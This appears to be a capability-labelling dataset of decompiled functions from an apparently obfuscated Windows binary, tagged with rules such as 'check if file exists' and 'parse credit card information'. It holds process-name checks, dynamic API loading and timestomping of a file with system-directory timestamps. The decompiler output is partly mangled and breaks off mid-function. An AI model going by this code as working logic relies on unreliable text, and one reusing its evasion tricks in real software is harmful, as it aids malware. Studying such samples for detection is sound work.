{
    "00401000": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x004011bd) overlaps instruction at (ram,0x004011bb)\n// \n// WARNING: Removing unreachable block (ram,0x00401058)\n// WARNING: Removing unreachable block (ram,0x00401083)\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nuint __cdecl fcn.00401000(uint *arg_8h)\n\n{\n    int32_t *piVar1;\n    char cVar5;\n    uint uVar2;\n    char *pcVar3;\n    int32_t iVar4;\n    int32_t iVar6;\n    int32_t extraout_ECX;\n    char *pcVar7;\n    uint32_t uVar8;\n    uint *puVar9;\n    uint8_t uVar10;\n    bool bVar11;\n    uint8_t in_AF;\n    ulong uVar12;\n    uchar s;\n    uint var_207h;\n    uint var_8h;\n    uint var_4h;\n    \n    s = 0;\n    puVar9 = &var_207h;\n    // [00] -r-x section size 16384 named .text\n    for (iVar6 = 0x7f; iVar6 != 0; iVar6 = iVar6 + -1) {\n        *puVar9 = 0;\n        puVar9 = puVar9 + 1;\n    }\n    *puVar9 = 0;\n    *(puVar9 + 2) = 0;\n    iVar6 = fcn.004013f0();\n    if (iVar6 == 0) {\n        return 0;\n    }\n    if (arg_8h == 0xffffffff) {\n        iVar6 = fcn.00401350();\n        if (iVar6 == 0) {\n            arg_8h = 0xd;\n        }\n        else {\n            arg_8h = 0xc;\n        }\n    }\n    iVar6 = (**0x41e59c)();\n    if (iVar6 == 0) {\n        uVar2 = (**0x41e5a4)();\n        (*_sym.imp.MSVCRT.dll_sprintf)(&s, 0x406280, uVar2, arg_8h);\n        iVar6 = (**0x41e5a0)(0x41e5b0, 0, 0, 0, 0);\n        if (iVar6 == 0) {\n            return 0;\n        }\n        uVar8 = arg_8h & 0xffff0000 | arg_8h + 1;\n        uVar10 = uVar8 < 0x222c;\n        bVar11 = (POPCOUNT(uVar8 - 0x222c & 0xff) & 1U) == 0;\n        var_4h = 3000;\n        uVar12 = (**0x41e598)(iVar6, 2, &var_4h, 4);\n        pcVar7 = uVar12 >> 0x20;\n        pcVar3 = uVar12;\n        if ((!bVar11) && (bVar11)) {\n            out(*arg_8h, uVar12 >> 0x20);\n            uVar10 = in_AF;\n            do {\n                cVar5 = pcVar3 >> 8;\n                uVar10 = 9 < (pcVar3 & 0xf) | uVar10;\n                pcVar3 = CONCAT31(CONCAT21(pcVar3 >> 0x10, cVar5 - uVar10), -uVar10);\n            } while (uVar10 || cVar5 == *pcVar7);\n        }\n        piVar1 = iVar6 + pcVar7 * 2;\n        *piVar1 = (*piVar1 + 0x7b) - uVar10;\n        *(extraout_ECX + 0x6a) = pcVar3;\n        *pcVar3 = *pcVar3 + (extraout_ECX >> 8);\n        *pcVar3 = *pcVar3 + pcVar3;\n        iVar4 = (**0x41e594)(iVar6, &s, 0);\n        if (iVar4 == 0) {\n            (**0x41e5a8)(iVar6);\n            return 0;\n        }\n        (**0x41e5a8)(iVar4);\n        (**0x41e5a8)(iVar6);\n        return 1;\n    }\n    return 0;\n}\n",
        "token_count": 970
    },
    "004017a0": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Control flow encountered bad instruction data\n// WARNING: Instruction at (ram,0x00401815) overlaps instruction at (ram,0x00401813)\n// \n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nvoid __cdecl\nfcn.004017a0(uint arg_8h, uint arg_ch, uint arg_10h, int32_t arg_14h, int32_t arg_18h, uint arg_1ch, int32_t arg_20h)\n\n{\n    char *pcVar1;\n    uint uVar2;\n    int32_t iVar3;\n    int16_t extraout_CX;\n    int32_t extraout_ECX;\n    int32_t iVar4;\n    uint *puVar5;\n    bool bVar6;\n    char cVar7;\n    char cVar8;\n    ulong uVar9;\n    int32_t iStackY344;\n    uint uStackY340;\n    int32_t iStackY336;\n    uint uStackY332;\n    int32_t iStackY328;\n    int32_t iStackY324;\n    uint uStackY320;\n    int32_t iStackY316;\n    uint uStackY312;\n    uchar var_10ch;\n    uint var_10bh;\n    uint var_8h;\n    uint var_4h;\n    \n    fcn.00401940();\n    cVar8 = '\\0';\n    cVar7 = (extraout_CX - 1U & arg_1ch | 0x61be) < 0;\n    fcn.00401940();\n    uStackY312 = 0x20;\n    iStackY316 = arg_10h;\n    uStackY320 = arg_1ch;\n    iStackY324 = arg_18h;\n    iStackY328 = 0x40180a;\n    uVar9 = fcn.00401940();\n    iVar3 = uVar9;\n    if ((cVar8 != cVar7) || (iStackY328 = arg_18h,  iVar4 = extraout_ECX,  cVar8 == cVar7)) {\n        iStackY336 = arg_14h;\n        iVar3 = arg_20h + 0xe0;\n        uStackY332 = 0x20;\n        iVar4 = arg_14h;\n        uStackY340 = arg_1ch;\n        iStackY328 = iVar3;\n    }\n    cVar7 = uVar9 >> 0x28;\n    pcVar1 = uVar9 >> 0x20 & 0xffff0000 | CONCAT11(uVar9 >> 0x20, cVar7);\n    *pcVar1 = *pcVar1 + cVar7;\n    pcVar1[0x6a] = pcVar1[0x6a] + iVar3;\n    *(iVar4 + 0x57) = *(iVar4 + 0x57) & iVar3;\n    iStackY344 = arg_18h;\n    uVar2 = fcn.00401940();\n    if ((&stack0xfffffea8 < 0xffffffc4) && (&stack0xfffffea8 >= 0xffffffc4)) {\n        out(0xbd, uVar2);\n        return;\n    }\n    iVar3 = func_0x00401750();\n    if (iVar3 == -1) {\n        iVar3 = (*_sym.imp.MSVCRT.dll_rand)();\n        *(arg_20h + 0x120) = iVar3 % 5;\n    }\n    else {\n        *(arg_20h + 0x120) = iVar3;\n    }\n    var_10ch = 0;\n    puVar5 = &fcn.004017a0::var_10bh;\n    for (iVar3 = 0x40; iVar3 != 0; iVar3 = iVar3 + -1) {\n        *puVar5 = 0;\n        puVar5 = puVar5 + 1;\n    }\n    *puVar5 = 0;\n    var_4h = 0x104;\n    iStackY316 = puVar5 + 3;\n    *(puVar5 + 2) = 0;\n    uStackY312 = 0x4018ba;\n    iVar3 = fcn.00401220(0x80000001, 0x40629c, 0x4062c8, &fcn.004017a0::var_8h, &stack0xfffffef0, &fcn.004017a0::var_4h)\n    ;\n    if (iVar3 != 0) {\n        iVar3 = (*_sym.imp.MSVCRT.dll__stricmp)();\n        bVar6 = iVar3 == 0;\n        if (bVar6) {\n            if ((!bVar6) && (bVar6)) {\n    // WARNING: Bad instruction - Truncating control flow here\n                halt_baddata();\n            }\n            *(arg_20h + 0x120) = *(arg_20h + 0x120) | 0x80;\n        }\n    }\n    return;\n}\n",
        "token_count": 1111
    },
    "00401b50": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nbool fcn.00401b50(void)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    uint *puVar3;\n    uint uStack528;\n    uchar auStack524 [4];\n    uchar uStack520;\n    uint uStack519;\n    uchar auStack260 [260];\n    \n    uStack520 = 0;\n    puVar3 = &uStack519;\n    for (iVar2 = 0x40; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar3 = 0;\n        puVar3 = puVar3 + 1;\n    }\n    *puVar3 = 0;\n    *(puVar3 + 2) = 0;\n    uStack528 = 0x104;\n    iVar2 = fcn.00401220(0x80000002, 0x406480, 0x4064c0, auStack524, auStack260, &uStack528);\n    if (iVar2 == 0) {\n        return false;\n    }\n    iVar2 = (*_sym.imp.MSVCRT.dll__access)(auStack260, 0);\n    if (iVar2 == -1) {\n        return false;\n    }\n    iVar2 = fcn.00401a60(auStack260, &uStack520);\n    pcVar1 = _sym.imp.MSVCRT.dll_strstr;\n    if (iVar2 == 0) {\n        return false;\n    }\n    iVar2 = (*_sym.imp.MSVCRT.dll_strstr)(&uStack520, 0x4064d8);\n    if (iVar2 != 0) {\n        return true;\n    }\n    iVar2 = (*pcVar1)(&uStack520, 0x4064dc);\n    return iVar2 != 0;\n}\n",
        "token_count": 395
    },
    "00401f60": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00402078) overlaps instruction at (ram,0x00402074)\n// \n// WARNING: Removing unreachable block (ram,0x00402064)\n// WARNING: Removing unreachable block (ram,0x0040206e)\n\nuint fcn.00401f60(uint param_1)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    uint32_t uVar4;\n    uint *puVar5;\n    char *pcVar6;\n    char *pcVar7;\n    uint *puVar9;\n    bool bVar10;\n    uint8_t in_IF;\n    bool bVar11;\n    char cStack560;\n    uint uStack559;\n    uchar uStack300;\n    uint uStack299;\n    uchar auStack40 [4];\n    uchar auStack36 [8];\n    uchar auStack28 [8];\n    uchar auStack20 [16];\n    char *pcVar8;\n    \n    bVar11 = false;\n    cStack560 = '\\0';\n    puVar5 = &uStack559;\n    for (iVar2 = 0x40; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar5 = 0;\n        puVar5 = puVar5 + 1;\n    }\n    *puVar5 = 0;\n    *(puVar5 + 2) = 0;\n    bVar10 = true;\n    uStack300 = '\\0';\n    puVar5 = &uStack299;\n    for (iVar2 = 0x40; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar5 = 0;\n        puVar5 = puVar5 + 1;\n    }\n    *puVar5 = 0;\n    *(puVar5 + 2) = 0;\n    (*_sym.imp.KERNEL32.dll_GetSystemDirectoryA)(&cStack560, 0x104);\n    if ((!bVar10) && (bVar10)) {\n        bVar11 = ((in_IF & 1) * 0x200 & 0x400) != 0;\n    }\n    uVar3 = 0xffffffff;\n    pcVar8 = &cStack560;\n    do {\n        pcVar6 = pcVar8;\n        if (uVar3 == 0) break;\n        uVar3 = uVar3 - 1;\n        pcVar6 = pcVar8 + bVar11 * -2 + 1;\n        cVar1 = *pcVar8;\n        pcVar8 = pcVar6;\n    } while (cVar1 != '\\0');\n    uVar3 = ~uVar3;\n    puVar5 = pcVar6 + -uVar3;\n    puVar9 = &uStack300;\n    for (uVar4 = uVar3 >> 2; uVar4 != 0; uVar4 = uVar4 - 1) {\n        *puVar9 = *puVar5;\n        puVar5 = puVar5 + bVar11 * -2 + 1;\n        puVar9 = puVar9 + bVar11 * -2 + 1;\n    }\n    for (uVar3 = uVar3 & 3; uVar3 != 0; uVar3 = uVar3 - 1) {\n        *puVar9 = *puVar5;\n        puVar5 = puVar5 + bVar11 * -2 + 1;\n        puVar9 = puVar9 + bVar11 * -2 + 1;\n    }\n    uVar3 = 0xffffffff;\n    pcVar8 = 0x406048;\n    do {\n        pcVar6 = pcVar8;\n        if (uVar3 == 0) break;\n        uVar3 = uVar3 - 1;\n        pcVar6 = pcVar8 + bVar11 * -2 + 1;\n        cVar1 = *pcVar8;\n        pcVar8 = pcVar6;\n    } while (cVar1 != '\\0');\n    uVar3 = ~uVar3;\n    iVar2 = -1;\n    pcVar8 = &uStack300;\n    do {\n        pcVar7 = pcVar8;\n        if (iVar2 == 0) break;\n        iVar2 = iVar2 + -1;\n        pcVar7 = pcVar8 + bVar11 * -2 + 1;\n        cVar1 = *pcVar8;\n        pcVar8 = pcVar7;\n    } while (cVar1 != '\\0');\n    puVar5 = pcVar6 + -uVar3;\n    puVar9 = pcVar7 + -1;\n    for (uVar4 = uVar3 >> 2; uVar4 != 0; uVar4 = uVar4 - 1) {\n        *puVar9 = *puVar5;\n        puVar5 = puVar5 + bVar11 * -2 + 1;\n        puVar9 = puVar9 + bVar11 * -2 + 1;\n    }\n    for (uVar3 = uVar3 & 3; uVar3 != 0; uVar3 = uVar3 - 1) {\n        *puVar9 = *puVar5;\n        puVar5 = puVar5 + bVar11 * -2 + 1;\n        puVar9 = puVar9 + bVar11 * -2 + 1;\n    }\n    (*_sym.imp.KERNEL32.dll_GetFileAttributesExA)(&uStack300, 0, auStack40);\n    iVar2 = fcn.004022d0(param_1);\n    if (iVar2 != -1) {\n        (*_sym.imp.KERNEL32.dll_SetFileTime)(iVar2, auStack36, auStack28, auStack20);\n        (*_sym.imp.KERNEL32.dll_CloseHandle)(iVar2);\n        return 1;\n    }\n    return 0;\n}\n",
        "token_count": 1297
    },
    "004027d0": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Control flow encountered bad instruction data\n// WARNING: Instruction at (ram,0x00402868) overlaps instruction at (ram,0x00402867)\n// \n// WARNING: Removing unreachable block (ram,0x004028aa)\n// WARNING: Removing unreachable block (ram,0x004028b7)\n// WARNING: Removing unreachable block (ram,0x00402868)\n// WARNING: Could not reconcile some variable overlaps\n\nbool fcn.004027d0(void)\n\n{\n    int32_t iVar1;\n    ushort extraout_DX;\n    uchar *unaff_ESI;\n    uint *puVar2;\n    bool bVar3;\n    uint var_80h;\n    uint var_60h;\n    uint var_40h;\n    uchar var_20h;\n    uint var_1fh;\n    \n    iVar1 = fcn.004024e0();\n    if (iVar1 == 0) {\n        fcn.00402990();\n        return false;\n    }\n    fcn.00402ec0();\n    iVar1 = fcn.00402bc0(0x406074);\n    bVar3 = iVar1 == -1;\n    if (!bVar3) {\n        iVar1 = fcn.00402bc0(0x406068);\n        if (iVar1 == -1) {\n            fcn.00402990();\n        }\n        return false;\n    }\n    fcn.00403a50();\n    if ((!bVar3) && (bVar3)) {\n        out(*unaff_ESI, extraout_DX);\n    }\n    iVar1 = fcn.00403fe0();\n    if (iVar1 != 0) {\n        return false;\n    }\n    var_20h = 0;\n    var_80h._0_1_ = 0;\n    puVar2 = &var_1fh;\n    for (iVar1 = 7; iVar1 != 0; iVar1 = iVar1 + -1) {\n        *puVar2 = 0;\n        puVar2 = puVar2 + 1;\n    }\n    *puVar2 = 0;\n    *(puVar2 + 2) = 0;\n    var_60h._0_1_ = 0;\n    puVar2 = &var_80h + 1;\n    for (iVar1 = 7; iVar1 != 0; iVar1 = iVar1 + -1) {\n        *puVar2 = 0;\n        puVar2 = puVar2 + 1;\n    }\n    *puVar2 = 0;\n    *(puVar2 + 2) = 0;\n    var_40h._0_1_ = 0;\n    puVar2 = &var_60h + 1;\n    for (iVar1 = 7; iVar1 != 0; iVar1 = iVar1 + -1) {\n        *puVar2 = 0;\n        puVar2 = puVar2 + 1;\n    }\n    *puVar2 = 0;\n    *(puVar2 + 2) = 0;\n    puVar2 = &var_40h + 1;\n    for (iVar1 = 7; iVar1 != 0; iVar1 = iVar1 + -1) {\n        *puVar2 = 0;\n        puVar2 = puVar2 + 1;\n    }\n    *puVar2 = 0;\n    *(puVar2 + 2) = 0;\n    iVar1 = fcn.00402370(&var_80h, &var_60h, &var_20h, &var_40h);\n    if (iVar1 != 0) {\n        iVar1 = fcn.00404510(&var_20h);\n        if (iVar1 != 0) {\n            iVar1 = fcn.00401c40(&var_80h, &var_60h, &var_20h, &var_40h);\n            return iVar1 != 0;\n        }\n        return false;\n    }\n    return false;\n}\n",
        "token_count": 875
    },
    "00402bc0": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Control flow encountered bad instruction data\n// WARNING: Instruction at (ram,0x00402c58) overlaps instruction at (ram,0x00402c56)\n// \n\nuint __cdecl fcn.00402bc0(uint arg_8h)\n\n{\n    uint uVar1;\n    code *pcVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    uint *puVar5;\n    uint var_12ch;\n    uint var_128h;\n    uint var_124h;\n    uint var_108h;\n    uint hObject;\n    \n    hObject = 0xffffffff;\n    iVar3 = (**0x41e5bc)(2, 0);\n    if (iVar3 == -1) {\n        return 0xffffffff;\n    }\n    var_12ch = 0x128;\n    puVar5 = &var_128h;\n    for (iVar4 = 0x49; iVar4 != 0; iVar4 = iVar4 + -1) {\n        *puVar5 = 0;\n        puVar5 = puVar5 + 1;\n    }\n    iVar4 = (**0x41e5c0)(iVar3, &var_12ch);\n    pcVar2 = _sym.imp.MSVCRT.dll__stricmp;\n    uVar1 = hObject;\n    while( true ) {\n        hObject = uVar1;\n        if (iVar4 == 0) {\n            (*_sym.imp.KERNEL32.dll_CloseHandle)(iVar3);\n            return uVar1;\n        }\n        if ((-1 < iVar4) && (-1 >= iVar4)) break;\n        iVar4 = (*pcVar2)(&var_108h, arg_8h);\n        if (iVar4 == 0) {\n            (*_sym.imp.KERNEL32.dll_CloseHandle)(iVar3);\n            return var_124h;\n        }\n        iVar4 = (**0x41e5c4)(iVar3, &var_12ch);\n        uVar1 = hObject;\n    }\n    // WARNING: Bad instruction - Truncating control flow here\n    halt_baddata();\n}\n",
        "token_count": 454
    },
    "00402e70": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nulong __cdecl fcn.00402e70(uint arg_8h)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = (*_sym.imp.MSVCRT.dll__access)(arg_8h, 0);\n    if (iVar1 != -1) {\n        return 0;\n    }\n    return 1;\n}\n",
        "token_count": 73
    },
    "00403fe0": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nuint fcn.00403fe0(void)\n\n{\n    int32_t iVar1;\n    uint var_4h;\n    \n    iVar1 = fcn.004022d0(0x406010);\n    if (iVar1 != -1) {\n        (*_sym.imp.KERNEL32.dll_CloseHandle)(iVar1);\n        return 1;\n    }\n    return 0;\n}\n",
        "token_count": 97
    },
    "004013f0": {
        "rules": [
            "parse credit card information/562ff391f55141bc9728340148e50ea1"
        ],
        "decompiled_code": "\nuint fcn.004013f0(void)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    code *pcVar3;\n    code *pcVar4;\n    char in_AF;\n    bool bVar5;\n    \n    pcVar3 = _sym.imp.KERNEL32.dll_LoadLibraryA;\n    if (*0x41e5ac != 0) {\n        return 1;\n    }\n    iVar2 = (*_sym.imp.KERNEL32.dll_LoadLibraryA)();\n    pcVar4 = _sym.imp.KERNEL32.dll_GetProcAddress;\n    if (iVar2 == 0) {\n        return 0;\n    }\n    *0x41e59c = (*_sym.imp.KERNEL32.dll_GetProcAddress)();\n    if (*0x41e59c == 0) {\n        return 0;\n    }\n    iVar2 = (*pcVar3)();\n    bVar5 = iVar2 == 0;\n    if (bVar5) {\n        return 0;\n    }\n    if ((!bVar5) && (bVar5)) {\n        pcVar3 = pcVar3 + 1;\n        if (pcVar3 == NULL) goto code_r0x004014df;\n        piVar1 = (CONCAT11(in_AF, in_AF * '\\x06') & 0xff0f) + 0x2a;\n        *piVar1 = *piVar1 - pcVar3;\n        pcVar4 = pcVar4 + 1;\n    }\n    *0x41e5a4 = (*pcVar4)();\n    if (*0x41e5a4 == 0) {\n        return 0;\n    }\n    iVar2 = (*pcVar3)();\n    if (iVar2 == 0) {\n        return 0;\n    }\ncode_r0x004014df:\n    pcVar3 = _sym.imp.KERNEL32.dll_GetProcAddress;\n    *0x41e5a0 = (*_sym.imp.KERNEL32.dll_GetProcAddress)();\n    if (*0x41e5a0 == 0) {\n        return 0;\n    }\n    *0x41e594 = (*pcVar3)();\n    pcVar3 = _sym.imp.KERNEL32.dll_GetProcAddress;\n    if (*0x41e594 == 0) {\n        return 0;\n    }\n    *0x41e598 = (*_sym.imp.KERNEL32.dll_GetProcAddress)();\n    if (*0x41e598 == 0) {\n        return 0;\n    }\n    *0x41e5a8 = (*pcVar3)();\n    if (*0x41e5a8 != 0) {\n        *0x41e5ac = 1;\n        return 1;\n    }\n    return 0;\n}\n",
        "token_count": 592
    },
    "00403340": {
        "rules": [
            "parse credit card information/562ff391f55141bc9728340148e50ea1"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x0040383a) overlaps instruction at (ram,0x00403838)\n// \n// WARNING: Control flow encountered bad instruction data\n// WARNING: Removing unreachable block (ram,0x00403664)\n\nvoid fcn.00403340(void)\n\n{\n    int32_t *piVar1;\n    char cVar2;\n    uint16_t uVar3;\n    int32_t iVar4;\n    uint uVar5;\n    uint32_t uVar6;\n    char extraout_CL;\n    char extraout_CL_00;\n    uint8_t extraout_CL_01;\n    uint8_t extraout_CH;\n    uint extraout_ECX;\n    int32_t extraout_ECX_00;\n    int32_t extraout_ECX_01;\n    uint32_t extraout_ECX_02;\n    int32_t extraout_ECX_03;\n    uint8_t extraout_DL;\n    ushort extraout_DX;\n    int32_t extraout_EDX;\n    char *pcVar7;\n    uint extraout_EDX_00;\n    uint extraout_EDX_01;\n    uchar uVar8;\n    int32_t unaff_EBX;\n    uint unaff_EBP;\n    uint *unaff_ESI;\n    uint *puVar9;\n    uint *puVar10;\n    uint *unaff_EDI;\n    uint *puVar11;\n    ushort in_ES;\n    bool bVar12;\n    uint8_t uVar13;\n    uchar uVar14;\n    uint8_t in_AF;\n    bool bVar15;\n    uchar uVar16;\n    uint8_t in_IF;\n    bool bVar17;\n    char cVar18;\n    ulong uVar19;\n    uint *puStackY103;\n    int32_t in_stack_ffffffa9;\n    char cVar20;\n    uchar uVar21;\n    ushort uVar22;\n    ushort uVar23;\n    uchar uVar24;\n    uchar uVar25;\n    uchar *arg_10h;\n    uchar uVar26;\n    uchar uVar27;\n    uchar uVar28;\n    uchar uVar29;\n    uchar uVar30;\n    uchar uVar31;\n    uchar uVar32;\n    uchar uVar33;\n    ushort uVar34;\n    uchar uVar35;\n    uchar uVar36;\n    uchar uVar37;\n    uchar uVar38;\n    uchar uVar39;\n    uchar uVar40;\n    char cVar41;\n    \n    bVar17 = false;\n    fcn.00402190(0x410584, 9, 0x406024, 10);\n    uVar3 = fcn.00402190(0x410584, 9, 0x406030, 0x12);\n    bVar12 = false;\n    bVar15 = (CONCAT31(extraout_CH & 0xb, 0xc) & (unaff_EDI & uVar3) + 0xaf70) == 0;\n    fcn.00402190(0x410584, 9, 0x406044, 4);\n    if ((!bVar12 && !bVar15) && (bVar12 || bVar15)) {\n        do {\n    // WARNING: Do nothing block with infinite loop\n        } while( true );\n    }\n    fcn.00402190(0x410584, 9, 0x406048, 0xc);\n    puVar10 = unaff_ESI;\n    if ((!bVar15) && (bVar15)) {\n        puVar10 = unaff_ESI + 1;\n        out(*unaff_ESI, extraout_DX);\n    }\n    fcn.00402190(0x410584, 9, 0x406054, 7);\n    fcn.00402190(0x410584, 9, 0x40605c, 0xb);\n    fcn.00402190(0x410584, 9, 0x406068, 0xc);\n    fcn.00402190(0x410584, 9, 0x406074, 8);\n    fcn.00402190(0x410584, 9, 0x40607c, 0xd);\n    uVar8 = unaff_EBX >> 8;\n    fcn.00402190(0x410584, 9, 0x40608c, 0x18);\n    uVar28 = 0xa4;\n    uVar30 = 0x60;\n    uVar14 = 0x40;\n    uVar16 = 0;\n    uVar25 = 9;\n    uVar29 = 0;\n    uVar31 = 0;\n    uVar27 = 0;\n    cVar2 = fcn.00402190(0x410584, 9, 0x4060a4, 0x25);\n    bVar12 = (POPCOUNT(((cVar2 * '\\x02' | extraout_DL) ^ unaff_EBX) & 0xff) & 1U) == 0;\n    fcn.00402190(0x410584, 9, 0x4060cc, 10);\n    cVar2 = extraout_ECX >> 8;\n    if (bVar12) {\ncode_r0x0040353e:\n        uVar35 = 0xc;\n        cVar18 = '\\0';\n        uVar36 = 0;\n        uVar21 = 0;\n        uVar28 = 0xd8;\n        uVar30 = 0x60;\n        uVar14 = 0x40;\n        uVar16 = 0;\n        uVar25 = 9;\n        uVar29 = 0;\n        uVar31 = 0;\n        uVar27 = 0;\n    }\n    else {\n        uVar35 = extraout_ECX;\n        uVar36 = extraout_ECX >> 0x10;\n        uVar21 = extraout_ECX >> 0x18;\n        cVar18 = cVar2;\n        if (!bVar12) goto code_r0x0040353e;\n    }\n    *(extraout_EDX + 0xc) = *(extraout_EDX + 0xc) + -0x68;\n    *(extraout_EDX + 9) = *(extraout_EDX + 9) + cVar2;\n    fcn.00402190(0x410584, CONCAT13(uVar27, CONCAT12(uVar31, CONCAT11(uVar29, uVar25))), \n                 CONCAT13(uVar16, CONCAT12(uVar14, CONCAT11(uVar30, uVar28))), \n                 CONCAT13(uVar21, CONCAT12(uVar36, CONCAT11(cVar18, uVar35))));\n    iVar4 = fcn.00402190(0x410584, 9, 0x4060e4, 0xd);\n    iVar4 = extraout_ECX_00 - iVar4;\n    uVar3 = iVar4 & 0xff00 | iVar4 ^ iVar4 >> 8 | 0x3d00 | unaff_EBX;\n    bVar12 = uVar3 >> 8 == uVar3;\n    fcn.00402190(0x410584, 9, 0x4060f4, 6);\n    if ((!bVar12) && (bVar12)) {\n        bVar17 = ((in_IF & 1) * 0x200 & 0x400) != 0;\n        in_AF = ((in_AF & 1) * '\\x10' & 0x10) != 0;\n    }\n    fcn.00402190(0x410584, 9, 0x4060fc, 5);\n    fcn.00402190(0x410584, 9, 0x406104, 0xd);\n    uVar25 = unaff_EBX >> 0x10;\n    uVar29 = unaff_EBX >> 0x18;\n    fcn.00402190(0x410584, 9, 0x406114, 0x19);\n    cVar18 = SBORROW1(extraout_CL, '\\x01');\n    cVar2 = extraout_CL + -1 < '\\0';\n    uVar5 = fcn.00402190(0x410584, 9, 0x406130, 0xf);\n    puVar11 = unaff_EDI;\n    if ((cVar18 == cVar2) && (cVar18 != cVar2)) {\n        out(0xc4, uVar5);\n        bVar17 = false;\n        puVar11 = unaff_EDI + 1;\n        *unaff_EDI = uVar5;\n    }\n    uVar28 = 0x40;\n    uVar34 = 0x4061;\n    uVar30 = 0;\n    uVar31 = 9;\n    uVar23 = 0;\n    uVar27 = 0;\n    fcn.00402190(0x410584, 9, 0x406140, 0xe);\n    uVar13 = 0;\n    bVar12 = (POPCOUNT(extraout_CL_00 - 5U & 0x44) & 1U) == 0;\n    uVar14 = 0xb1;\n    uVar16 = 0x36;\n    uVar19 = fcn.00402190(0x410584, 9, 0x406150, 0xd);\n    pcVar7 = uVar19 >> 0x20;\n    uVar5 = uVar19;\n    if (bVar12) {\ncode_r0x004036c8:\n        uVar14 = 0xc;\n        uVar16 = 0;\n        uVar35 = 0;\n        uVar36 = 0;\n        uVar28 = 0x60;\n        uVar34 = 0x4061;\n        uVar30 = 0;\n        uVar31 = 9;\n        uVar23 = 0;\n        uVar27 = 0;\n    }\n    else {\n        uVar35 = SUB41(puVar10, 0);\n        uVar36 = puVar10 >> 8;\n        if (!bVar12) goto code_r0x004036c8;\n        puVar9 = puVar10 + bVar17 * -2 + 1;\n        out(*puVar10, uVar19 >> 0x20);\n        uVar13 = in_AF;\n        do {\n            cVar2 = uVar5 >> 8;\n            uVar13 = 9 < (uVar5 & 0xf) | uVar13;\n            uVar5 = CONCAT31(CONCAT21(uVar5 >> 0x10, cVar2 - uVar13), -uVar13);\n            puVar10 = puVar9;\n            in_AF = uVar13;\n        } while (uVar13 || cVar2 == *pcVar7);\n    }\n    arg_10h = &stack0xffffffcd;\n    piVar1 = puVar11 + pcVar7 * 2;\n    *piVar1 = (*piVar1 + 0x7b) - uVar13;\n    *(extraout_ECX_01 + 0x6a) = uVar5;\n    uVar26 = unaff_EBX;\n    uVar21 = unaff_EBP;\n    uVar22 = unaff_EBP >> 8;\n    uVar24 = unaff_EBP >> 0x18;\n    pcVar7[9] = pcVar7[9] + (extraout_ECX_01 >> 8);\n    fcn.00402190(0x410584, CONCAT13(uVar27, CONCAT21(uVar23, uVar31)), CONCAT13(uVar30, CONCAT21(uVar34, uVar28)), \n                 CONCAT13(uVar36, CONCAT12(uVar35, CONCAT11(uVar16, uVar14))));\n    cVar20 = puVar11 >> 8;\n    bVar12 = 0xffffffdf < &stack0xffffffc9;\n    cVar18 = SCARRY4(unaff_EBX, 1);\n    cVar2 = unaff_EBX + 1 < 0;\n    bVar15 = unaff_EBX == -1;\n    uVar31 = 0x6c;\n    cVar41 = '@';\n    uVar6 = fcn.00402190(0x410584, 9, 0x40616c, 0xf);\n    if ((!bVar15) && (bVar15)) {\n        if (bVar12 || unaff_EBX + 1 == 0) goto code_r0x00403753;\n        in_AF = 9 < (uVar6 & 0xf) | in_AF;\n        piVar1 = (uVar6 & 0xffff0000 | CONCAT11((uVar6 >> 8) + in_AF, uVar6 + in_AF * '\\x06') & 0xff0f) + 0x2a;\n        *piVar1 = *piVar1 - (unaff_EBX + 1);\n        cVar18 = SCARRY4(puVar10, 1);\n        cVar2 = puVar10 + 1 < 0;\n    }\n    fcn.00402190(0x410584, 9, 0x40617c, 0xb);\n    if ((cVar18 != cVar2) || (cVar18 == cVar2)) {\n        uVar26 = 9;\n        uVar8 = 0;\n        uVar25 = 0;\n        uVar29 = 0;\n    }\n    *(in_stack_ffffffa9 + 9) = *(in_stack_ffffffa9 + 9) + cVar20;\n    fcn.00402190(0x410584, CONCAT13(uVar24, CONCAT21(uVar22, uVar21)), arg_10h, \n                 CONCAT13(uVar29, CONCAT12(uVar25, CONCAT11(uVar8, uVar26))));\n    puVar10 = puStackY103;\ncode_r0x00403753:\n    fcn.00402190(0x410584, 9, 0x406194, 0xb);\n    fcn.00402190(0x410584, 9, 0x4061a0, 10);\n    fcn.00402190(0x410584, 9, 0x4061ac, 0xc);\n    fcn.00402190(0x410584, 9, 0x4061b8, 0xe);\n    fcn.00402190(0x410584, 9, 0x4061c8, 0x11);\n    fcn.00402190(0x410584, 9, 0x4061dc, 0x13);\n    uVar29 = 0x14;\n    uVar27 = 0;\n    uVar28 = 0;\n    uVar30 = 0;\n    uVar5 = 0x4061f0;\n    uVar8 = 9;\n    uVar23 = 0;\n   